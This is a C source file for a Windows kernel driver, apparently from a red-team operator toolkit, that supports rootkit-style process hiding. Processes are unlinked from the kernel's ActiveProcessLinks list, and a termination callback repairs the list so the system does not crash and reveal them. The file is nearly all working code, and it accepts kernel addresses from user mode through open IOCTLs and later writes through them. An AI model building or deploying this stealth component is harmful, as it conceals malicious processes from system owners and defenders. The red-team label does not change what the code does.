// peekaboo_probe.c — Nyx Peekaboo probe driver (the kernel side of the
// PeekabooProbe seam, crates/operator-kernelsdk/src/win/peekaboo.rs).
//
// Purpose: provide the kernel callback seam for the offset-free Peekaboo
// PatchGuard window (Outflank Peekaboo technique). DKOM-hiding a process via
// ActiveProcessLinks unlink bugchecks at process TERMINATION:
// nt!PspProcessDelete validates the terminating EPROCESS's LIST_ENTRY
// bidirectional consistency (Flink->Blink == entry && Blink->Flink == entry)
// and fast-fails with 0x139 KERNEL_SECURITY_CHECK_FAILURE on mismatch. This
// driver's PsSetCreateProcessNotifyRoutineEx callback fires BEFORE
// PspProcessDelete runs, and re-links the neighbors' cross-pointers back at
// the hidden entry so the validation sees a consistent list.
//
// The user-mode operator (nyx-kernel / operator-kernelsdk) talks to this
// driver over four METHOD_BUFFERED IOCTLs. THE WIRE CONTRACT BELOW MUST MATCH
// crates/operator-kernelsdk/src/win/peekaboo.rs EXACTLY — change both sides
// in lockstep and bump PEEKABOO_VERSION.
//
// Build: WDK/EWDK only (see README.md in this directory). Cannot be built on
// the macOS dev host. Requires signing (test-signing VM or attestation/EV).
//
// AUTHORIZED RED-TEAM USE ONLY. A bug in this code runs at IRQL PASSIVE_LEVEL
// in kernel context and can bugcheck the host.

#include <ntddk.h>

// ---- Wire contract (mirror win/peekaboo.rs — lockstep) -------------------

#define PEEKABOO_DEVICE_NAME L"\\Device\\PeekabooProbe"
#define PEEKABOO_DOS_NAME    L"\\??\\PeekabooProbe"

// ASCII "PKKP" little-endian; echoed in the handshake reply so the client can
// verify the device behind \\.\PeekabooProbe is really this driver.
#define PEEKABOO_MAGIC   0x504B4B50UL
#define PEEKABOO_VERSION 1UL

// CTL_CODE(FILE_DEVICE_UNKNOWN, fn, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PEEKABOO_HANDSHAKE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x222000
#define IOCTL_PEEKABOO_STATUS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x222004
#define IOCTL_PEEKABOO_TRACK     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x222008
#define IOCTL_PEEKABOO_UNTRACK   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x22200C

// status_flags bits
#define PEEKABOO_STATUS_CALLBACK_REGISTERED 0x1UL
#define PEEKABOO_STATUS_VALIDATION_ACTIVE   0x2UL

// capabilities bits
#define PEEKABOO_CAP_TERMINATION_REPAIR  0x1UL
#define PEEKABOO_CAP_VALIDATION_TRACKING 0x2UL

#define PEEKABOO_MAX_TRACKED 64

// Fixed-layout little-endian payloads (all naturally aligned; METHOD_BUFFERED
// SystemBuffer on both sides of the IOCTL).
#pragma pack(push, 1)
typedef struct _PEEKABOO_HANDSHAKE_REQUEST {
    ULONG Magic;
    ULONG Version;
} PEEKABOO_HANDSHAKE_REQUEST; // 8 bytes in

typedef struct _PEEKABOO_HANDSHAKE_REPLY {
    ULONG Magic;
    ULONG Version;
    ULONG Capabilities;
    ULONG StatusFlags;
} PEEKABOO_HANDSHAKE_REPLY; // 16 bytes out

typedef struct _PEEKABOO_STATUS_REPLY {
    ULONG StatusFlags;
    ULONG TrackedCount;
} PEEKABOO_STATUS_REPLY; // 8 bytes out

typedef struct _PEEKABOO_TRACK_REQUEST {
    ULONG64 EprocessKva;
    ULONG64 LinkKva; // EprocessKva + ActiveProcessLinks offset (computed user-side)
} PEEKABOO_TRACK_REQUEST; // 16 bytes in

typedef struct _PEEKABOO_UNTRACK_REQUEST {
    ULONG64 EprocessKva;
} PEEKABOO_UNTRACK_REQUEST; // 8 bytes in

typedef struct _PEEKABOO_COUNT_ACK {
    ULONG TrackedCount;
} PEEKABOO_COUNT_ACK; // 4 bytes out (TRACK / UNTRACK)
#pragma pack(pop)

// ---- Driver state ----------------------------------------------------------

static PDEVICE_OBJECT g_DeviceObject;
static BOOLEAN g_CallbackRegistered;
// >0 while a terminate callback for a tracked process is executing (i.e. a
// guarded PspProcessDelete validation is in progress or imminent). User-mode
// reads this via IOCTL_PEEKABOO_STATUS; PeekabooWindow refuses to open while set.
static volatile LONG g_ValidationActive;

// Tracked hidden entries. The link KVA comes from user mode (where the
// EPROCESS offsets are PDB-resolved) so this driver carries ZERO offset
// constants — no per-build maintenance on the driver side.
typedef struct _PEEKABOO_TRACKED {
    ULONG64 EprocessKva; // 0 = free slot
    ULONG64 LinkKva;
} PEEKABOO_TRACKED;

static PEEKABOO_TRACKED g_Tracked[PEEKABOO_MAX_TRACKED];
static KSPIN_LOCK g_TrackLock;

// Canonical-kernel-address gate (x64): never dereference or write a pointer a
// client handed us without this check — a user-range or garbage KVA in the
// callback is a bugcheck.
static BOOLEAN PeekabooIsCanonicalKernelVa(ULONG64 Va)
{
    return Va >= 0xFFFF800000000000ULL;
}

static ULONG PeekabooTrackedCount(VOID)
{
    KIRQL irql;
    ULONG count = 0;
    ULONG i;
    KeAcquireSpinLock(&g_TrackLock, &irql);
    for (i = 0; i < PEEKABOO_MAX_TRACKED; i++) {
        if (g_Tracked[i].EprocessKva != 0) {
            count++;
        }
    }
    KeReleaseSpinLock(&g_TrackLock, irql);
    return count;
}

// ---- The notify callback (the whole reason this driver exists) ------------
//
// Fires on process create/terminate. On terminate (CreateInfo == NULL) for a
// TRACKED EPROCESS, re-link the neighbors' cross-pointers at the hidden entry
// BEFORE PspProcessDelete's bidirectional LIST_ENTRY validation runs:
//
//     entry->Flink->Blink = entry;   // next.Blink = entry
//     entry->Blink->Flink = entry;   // prev.Flink = entry
//
// (the exact Outflank Peekaboo repair). The entry's own Flink/Blink were left
// pointing at its former neighbors by the user-side unlink_preserving_links —
// that is the contract; a self-looped entry (ProcessHider::unlink style) has
// nothing to repair with and is skipped by the canonical-pointer checks.
static VOID PeekabooCreateProcessNotifyEx(
    _Inout_ PEPROCESS Process,
    _In_ HANDLE ProcessId,
    _Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    KIRQL irql;
    ULONG i;
    ULONG64 eprocess = (ULONG64)(ULONG_PTR)Process;
    UNREFERENCED_PARAMETER(ProcessId);

    if (CreateInfo != NULL) {
        return; // process creation — nothing to repair
    }

    InterlockedIncrement(&g_ValidationActive);

    KeAcquireSpinLock(&g_TrackLock, &irql);
    for (i = 0; i < PEEKABOO_MAX_TRACKED; i++) {
        if (g_Tracked[i].EprocessKva == eprocess) {
            ULONG64 linkKva = g_Tracked[i].LinkKva;
            // Consume the slot BEFORE repairing: if the repair faults the
            // entry must not be retried on a later termination.
            g_Tracked[i].EprocessKva = 0;
            g_Tracked[i].LinkKva = 0;
            KeReleaseSpinLock(&g_TrackLock, irql);

            if (PeekabooIsCanonicalKernelVa(linkKva)) {
                PLIST_ENTRY entry = (PLIST_ENTRY)(ULONG_PTR)linkKva;
                __try {
                    PLIST_ENTRY next = entry->Flink;
                    PLIST_ENTRY prev = entry->Blink;
                    if (PeekabooIsCanonicalKernelVa((ULONG64)(ULONG_PTR)next) &&
                        PeekabooIsCanonicalKernelVa((ULONG64)(ULONG_PTR)prev)) {
                        next->Blink = entry;
                        prev->Flink = entry;
                    }
                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    // A stale entry (process already re-linked by the
                    // user-mode Drop repair, or the EPROCESS was reused) must
                    // not bugcheck the host. PspProcessDelete will validate
                    // whatever state remains — same residual risk as Peekaboo.
                }
            }

            InterlockedDecrement(&g_ValidationActive);
            return;
        }
    }
    KeReleaseSpinLock(&g_TrackLock, irql);

    InterlockedDecrement(&g_ValidationActive);
}

// ---- IRP dispatch ----------------------------------------------------------

static NTSTATUS PeekabooCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS PeekabooDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp)
{
    PIO_STACK_LOCATION stack;
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG_PTR information = 0;
    PVOID buffer;
    ULONG inLen, outLen;
    ULONG flags;
    UNREFERENCED_PARAMETER(DeviceObject);

    stack = IoGetCurrentIrpStackLocation(Irp);
    buffer = Irp->AssociatedIrp.SystemBuffer; // METHOD_BUFFERED
    inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
    outLen = stack->Parameters.DeviceIoControl.OutputBufferLength;

    flags = (g_CallbackRegistered ? PEEKABOO_STATUS_CALLBACK_REGISTERED : 0) |
            (g_ValidationActive > 0 ? PEEKABOO_STATUS_VALIDATION_ACTIVE : 0);

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_PEEKABOO_HANDSHAKE: {
        PEEKABOO_HANDSHAKE_REQUEST* req;
        PEEKABOO_HANDSHAKE_REPLY* rep;
        if (inLen < sizeof(PEEKABOO_HANDSHAKE_REQUEST) ||
            outLen < sizeof(PEEKABOO_HANDSHAKE_REPLY)) {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        req = (PEEKABOO_HANDSHAKE_REQUEST*)buffer;
        rep = (PEEKABOO_HANDSHAKE_REPLY*)buffer;
        if (req->Magic != PEEKABOO_MAGIC || req->Version != PEEKABOO_VERSION) {
            // Not our client (or a contract skew) — refuse rather than misparse.
            status = STATUS_INVALID_PARAMETER;
            break;
        }
        rep->Magic = PEEKABOO_MAGIC;
        rep->Version = PEEKABOO_VERSION;
        rep->Capabilities = PEEKABOO_CAP_TERMINATION_REPAIR | PEEKABOO_CAP_VALIDATION_TRACKING;
        rep->StatusFlags = flags;
        information = sizeof(PEEKABOO_HANDSHAKE_REPLY);
        status = STATUS_SUCCESS;
        break;
    }

    case IOCTL_PEEKABOO_STATUS: {
        PEEKABOO_STATUS_REPLY* rep;
        if (outLen < sizeof(PEEKABOO_STATUS_REPLY)) {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        rep = (PEEKABOO_STATUS_REPLY*)buffer;
        rep->StatusFlags = flags;
        rep->TrackedCount = PeekabooTrackedCount();
        information = sizeof(PEEKABOO_STATUS_REPLY);
        status = STATUS_SUCCESS;
        break;
    }

    case IOCTL_PEEKABOO_TRACK: {
        PEEKABOO_TRACK_REQUEST* req;
        PEEKABOO_COUNT_ACK* ack;
        KIRQL irql;
        ULONG i;
        if (inLen < sizeof(PEEKABOO_TRACK_REQUEST) ||
            outLen < sizeof(PEEKABOO_COUNT_ACK)) {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        req = (PEEKABOO_TRACK_REQUEST*)buffer;
        ack = (PEEKABOO_COUNT_ACK*)buffer;
        if (!PeekabooIsCanonicalKernelVa(req->EprocessKva) ||
            !PeekabooIsCanonicalKernelVa(req->LinkKva)) {
            // Refuse non-canonical pointers — storing them would turn the
            // terminate callback into a bugcheck.
            status = STATUS_INVALID_PARAMETER;
            break;
        }
        KeAcquireSpinLock(&g_TrackLock, &irql);
        status = STATUS_INSUFFICIENT_RESOURCES;
        for (i = 0; i < PEEKABOO_MAX_TRACKED; i++) {
            if (g_Tracked[i].EprocessKva == 0) {
                g_Tracked[i].EprocessKva = req->EprocessKva;
                g_Tracked[i].LinkKva = req->LinkKva;
                status = STATUS_SUCCESS;
                break;
            }
        }
        KeReleaseSpinLock(&g_TrackLock, irql);
        if (NT_SUCCESS(status)) {
            ack->TrackedCount = PeekabooTrackedCount();
            information = sizeof(PEEKABOO_COUNT_ACK);
        }
        break;
    }

    case IOCTL_PEEKABOO_UNTRACK: {
        PEEKABOO_UNTRACK_REQUEST* req;
        PEEKABOO_COUNT_ACK* ack;
        KIRQL irql;
        ULONG i;
        if (inLen < sizeof(PEEKABOO_UNTRACK_REQUEST) ||
            outLen < sizeof(PEEKABOO_COUNT_ACK)) {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        req = (PEEKABOO_UNTRACK_REQUEST*)buffer;
        ack = (PEEKABOO_COUNT_ACK*)buffer;
        KeAcquireSpinLock(&g_TrackLock, &irql);
        for (i = 0; i < PEEKABOO_MAX_TRACKED; i++) {
            if (g_Tracked[i].EprocessKva == req->EprocessKva) {
                g_Tracked[i].EprocessKva = 0;
                g_Tracked[i].LinkKva = 0;
                break;
            }
        }
        KeReleaseSpinLock(&g_TrackLock, irql);
        // Untrack of an unknown entry is NOT an error: the terminate callback
        // may already have consumed it. Idempotent by contract.
        ack->TrackedCount = PeekabooTrackedCount();
        information = sizeof(PEEKABOO_COUNT_ACK);
        status = STATUS_SUCCESS;
        break;
    }

    default:
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = information;
    IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

static VOID PeekabooUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING dosName;
    UNREFERENCED_PARAMETER(DriverObject);

    if (g_CallbackRegistered) {
        PsSetCreateProcessNotifyRoutineEx(PeekabooCreateProcessNotifyEx, TRUE);
        g_CallbackRegistered = FALSE;
    }
    RtlInitUnicodeString(&dosName, PEEKABOO_DOS_NAME);
    IoDeleteSymbolicLink(&dosName);
    if (g_DeviceObject != NULL) {
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
    }
}

// ---- Entry -----------------------------------------------------------------

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNICODE_STRING deviceName;
    UNICODE_STRING dosName;
    NTSTATUS status;
    UNREFERENCED_PARAMETER(RegistryPath);

    KeInitializeSpinLock(&g_TrackLock);
    RtlZeroMemory(g_Tracked, sizeof(g_Tracked));
    g_ValidationActive = 0;

    // Register the notify callback FIRST: if device creation below fails we
    // unwind the registration and the driver never presents a device it
    // cannot back (the client handshake would otherwise arm a window whose
    // repair path does not exist).
    status = PsSetCreateProcessNotifyRoutineEx(PeekabooCreateProcessNotifyEx, FALSE);
    if (!NT_SUCCESS(status)) {
        return status; // e.g. STATUS_ACCESS_DENIED on a tampered/CI-blocked load
    }
    g_CallbackRegistered = TRUE;

    RtlInitUnicodeString(&deviceName, PEEKABOO_DEVICE_NAME);
    status = IoCreateDevice(DriverObject,
                            0,
                            &deviceName,
                            FILE_DEVICE_UNKNOWN,
                            FILE_DEVICE_SECURE_OPEN,
                            FALSE,
                            &g_DeviceObject);
    if (!NT_SUCCESS(status)) {
        PsSetCreateProcessNotifyRoutineEx(PeekabooCreateProcessNotifyEx, TRUE);
        g_CallbackRegistered = FALSE;
        return status;
    }

    RtlInitUnicodeString(&dosName, PEEKABOO_DOS_NAME);
    status = IoCreateSymbolicLink(&dosName, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
        PsSetCreateProcessNotifyRoutineEx(PeekabooCreateProcessNotifyEx, TRUE);
        g_CallbackRegistered = FALSE;
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = PeekabooCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = PeekabooCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PeekabooDeviceControl;
    DriverObject->DriverUnload = PeekabooUnload;

    return STATUS_SUCCESS;
}
